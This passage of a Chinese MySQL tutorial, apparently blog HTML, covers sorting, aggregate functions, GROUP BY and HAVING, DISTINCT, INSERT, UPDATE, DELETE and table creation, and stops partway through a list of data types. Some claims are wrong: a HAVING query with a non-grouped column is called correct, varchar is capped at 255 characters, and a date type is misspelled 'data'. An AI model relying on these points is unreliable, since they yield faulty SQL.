username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br></pre></td></tr></table></figure><h3 id="三、数据排序"><a href="#三、数据排序" class="headerlink" title="三、数据排序"></a>三、数据排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">关键字：<span class="keyword">order</span> <span class="keyword">by</span> 指通过什么方式排序</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line"></span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line">指先按照 字段名<span class="number">1</span> 降序排列，如果 字段名<span class="number">1</span> 相同，则按照 字段名<span class="number">2</span> 的升序排列</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">按照这个表中 第二列 (第几个字段) 进行排序(默认升序)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">执行顺序：</span><br><span class="line"><span class="keyword">select</span>        <span class="number">3</span>号</span><br><span class="line">   字段</span><br><span class="line"><span class="keyword">from</span>          <span class="number">1</span>号</span><br><span class="line">   表名</span><br><span class="line"><span class="keyword">where</span>         <span class="number">2</span>号</span><br><span class="line">   条件</span><br><span class="line"><span class="keyword">order</span> by...;  <span class="number">4</span>号</span><br></pre></td></tr></table></figure><h3 id="四、分组函数（多行处理函数，聚合函数）"><a href="#四、分组函数（多行处理函数，聚合函数）" class="headerlink" title="四、分组函数（多行处理函数，聚合函数）"></a>四、分组函数（多行处理函数，聚合函数）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">所有的分组函数都是对&quot;某一组&quot;数据进行操作的，输入多行，输出一行。</span><br><span class="line">count  计数</span><br><span class="line">sum    求和</span><br><span class="line">avg    求平均值</span><br><span class="line">max    最大值</span><br><span class="line">min    最小值</span><br><span class="line">举例：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><h3 id="五、单行处理函数"><a href="#五、单行处理函数" class="headerlink" title="五、单行处理函数"></a>五、单行处理函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入一行，输出一行</span><br></pre></td></tr></table></figure><h4 id="空处理函数"><a href="#空处理函数" class="headerlink" title="空处理函数"></a>空处理函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当<span class="keyword">NULL</span>参与数学运算(即包括加减乘除)时，需要空处理函数</span><br><span class="line">格式：ifnull(可能为<span class="keyword">NULL</span>的数据，想要当作什么数据)</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br></pre></td></tr></table></figure><h3 id="六、注意点：count-与-count-具体的某个字段"><a href="#六、注意点：count-与-count-具体的某个字段" class="headerlink" title="六、注意点：count(*) 与 count(具体的某个字段)"></a>六、注意点：count(*) 与 count(具体的某个字段)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br></pre></td></tr></table></figure><h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是<span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br></pre></td></tr></table></figure><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">示例一：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(grade,<span class="number">0</span>)) <span class="keyword">from</span> students;</span><br><span class="line">求成绩之和，当成绩为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line">其实不需要ifnull()函数，因为分组函数会自动忽略<span class="keyword">NULL</span>，直接写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> students;  即可</span><br><span class="line">分组函数 sum 会自动忽略<span class="keyword">NULL</span>的grade，只计算非<span class="keyword">NULL</span>的成绩和</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例二：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">NULL</span>;</span><br><span class="line">没有必要使用 <span class="keyword">where</span> 过滤</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例三：</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;</span> <span class="built_in">avg</span>(grade);</span><br><span class="line">无效的使用了分组函数，将会报错，因为 <span class="keyword">sql</span>语句 规定分组函数不能出现在 <span class="keyword">where</span> 后面 </span><br><span class="line">解决方案：</span><br><span class="line">方案一：分两步</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> students;</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> 上面所求得的值;</span><br><span class="line">方案二：子查询（<span class="keyword">select</span>语句中嵌套<span class="keyword">select</span>语句）</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> students)</span><br></pre></td></tr></table></figure><h3 id="七、group-by-与-having"><a href="#七、group-by-与-having" class="headerlink" title="七、group by 与 having"></a>七、group by 与 having</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line">当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"></span><br><span class="line">当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br></pre></td></tr></table></figure><h4 id="多字段来联合分组"><a href="#多字段来联合分组" class="headerlink" title="多字段来联合分组"></a>多字段来联合分组</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,grade <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes,sex;</span><br><span class="line">先依次按照班级，性别进行分组，再查出分组之后学生的id与grade</span><br></pre></td></tr></table></figure><h4 id="having-与-where"><a href="#having-与-where" class="headerlink" title="having 与 where"></a>having 与 where</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">示例一：找到每个班级成绩大于等于<span class="number">700</span>学生中的最高成绩，该案例使用 <span class="keyword">where</span> 与 <span class="keyword">having</span> 过滤均可</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes <span class="keyword">having</span> grade <span class="operator">&gt;=</span> <span class="number">700</span>;</span><br><span class="line">先进性班级分组，然后使用<span class="keyword">having</span> 过滤</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="number">700</span> <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先使用<span class="keyword">where</span>进行条件过滤，然后再进行班级分组</span><br><span class="line">说明：两种方法均可，但是该示例中 <span class="keyword">where</span>比<span class="keyword">having</span> 的效率要高，因为 <span class="keyword">where</span> 中参与分组的数据比 <span class="keyword">having</span> 要少</span><br><span class="line"> </span><br><span class="line">示例二：找到每个班级成绩大于等于平均成绩的学生的学号，该案例只能使用 <span class="keyword">having</span> 进行过滤</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes <span class="keyword">having</span> grade <span class="operator">&gt;=</span> <span class="built_in">avg</span>(grade);</span><br><span class="line">使用 <span class="keyword">having</span>  过滤，正确</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="built_in">avg</span>(grade) <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">使用 <span class="keyword">where</span>语句过滤，错误，由于 <span class="keyword">where</span>语句之后不能出现分组函数</span><br><span class="line"></span><br><span class="line">总结：能使用 <span class="keyword">where</span> 最好使用 <span class="keyword">where</span> ,只有当只能使用 <span class="keyword">having</span> 才能满足需求时，再使用 <span class="keyword">having</span> 。</span><br></pre></td></tr></table></figure><h3 id="八、查询结果集的去重"><a href="#八、查询结果集的去重" class="headerlink" title="八、查询结果集的去重"></a>八、查询结果集的去重</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> job) <span class="keyword">from</span> company;</span><br><span class="line">统计该公司中工作岗位数量</span><br><span class="line">注：</span><br><span class="line"><span class="keyword">distinct</span> 只能出现在所有字段的最前面，表示将后面的字段联合起来一起去重</span><br></pre></td></tr></table></figure><h3 id="九、一个完整的-sql语句-执行顺序"><a href="#九、一个完整的-sql语句-执行顺序" class="headerlink" title="九、一个完整的 sql语句   执行顺序"></a>九、一个完整的 sql语句   执行顺序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> </span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure><h1 id="DML-数据操作语言"><a href="#DML-数据操作语言" class="headerlink" title="DML (数据操作语言)"></a>DML (数据操作语言)</h1><p><strong>插入数据 insert</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名(字段名<span class="number">1</span>，字段名<span class="number">2</span>，字段名<span class="number">3.</span>.....) <span class="keyword">values</span>(值<span class="number">1</span>，值<span class="number">2</span>，值<span class="number">3.</span>.....)；</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">字段的数据类型要与值对应，值的数量小于等于字段的数量，小于时，未被插入数据的字段为指定的默认值。</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(<span class="keyword">no</span>,name) <span class="keyword">values</span>(<span class="number">2007040202</span>,<span class="string">&#x27;lijun&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当一条<span class="keyword">insert</span>语句执行成功之后，表格中必然会多一行记录，即使为 <span class="keyword">NULL</span> 也不能再使用 <span class="keyword">insert</span> 进行插入，只能通过 update 进行更新。</span><br><span class="line">举例：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(sex,birth,classno) <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2002&#x27;</span>,<span class="string">&#x27;20070402&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line">字段名可以省略，但是值是数量与顺序必须与字段的数量与顺序相对应</span><br><span class="line">举例：</span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> t_stu <span class="keyword">values</span>(<span class="number">2007040203</span>,<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2001&#x27;</span>,<span class="string">&#x27;20070402&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> zhangsan <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2001</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> t_stu <span class="keyword">values</span>(<span class="number">2007040203</span>,<span class="string">&#x27;xiaohong&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> zhangsan <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2001</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> xiaohong <span class="operator">|</span> <span class="number">0</span>    <span class="operator">|</span>       <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> 一次可插入多行数据</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(<span class="keyword">no</span>,name,sex,birth,classno) <span class="keyword">values</span>(),(),()......;</span><br></pre></td></tr></table></figure><p><strong>修改数据 update</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">update 表名 <span class="keyword">set</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>,字段名<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>,......<span class="keyword">where</span> 条件；</span><br></pre></td></tr></table></figure><p><strong>删除数据 delete</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语法:</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件;  #可回滚</span><br><span class="line">对于大表：</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> 表名;#不可回滚，将会永久丢失</span><br></pre></td></tr></table></figure><h1 id="DDL-数据定义语言"><a href="#DDL-数据定义语言" class="headerlink" title="DDL(数据定义语言)"></a>DDL(数据定义语言)</h1><p><strong>表的创建</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">     字段名<span class="number">1</span>，数据类型，</span><br><span class="line">     字段名<span class="number">2</span>，数据类型，</span><br><span class="line">     字段名<span class="number">3</span>，数据类型，</span><br><span class="line">     ......</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看创建表的语法：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">+</span> 表名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t1;</span><br></pre></td></tr></table></figure><p><strong>Mysql 中常见的数据类型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>       整型</span><br><span class="line"><span class="type">bigint</span>    长整型</span><br><span class="line"><span class="type">smallint</span></span><br><span class="line">mediumint</span><br><span class="line"></span><br><span class="line"><span class="type">float</span>     浮点型</span><br><span class="line"><span class="keyword">double</span>    </span><br><span class="line"></span><br><span class="line"><span class="type">char</span>      定长字符串</span><br><span class="line"><span class="type">varchar</span>   可变长字符串(最多存储<span class="number">255</span>个字符)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>多选插入</span><br><span class="line">enum单选插入</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">data      日期类型</span><br><span class="line"><span class="keyword">year</span></span><br><span class="line"><span class="type">timestamp</span></span><br><span class="line"><span class="type">time</span></span><br><span class="line">datetime</span><br><span class="line"></span><br><span class="line"><span class="type">BLOB</span>      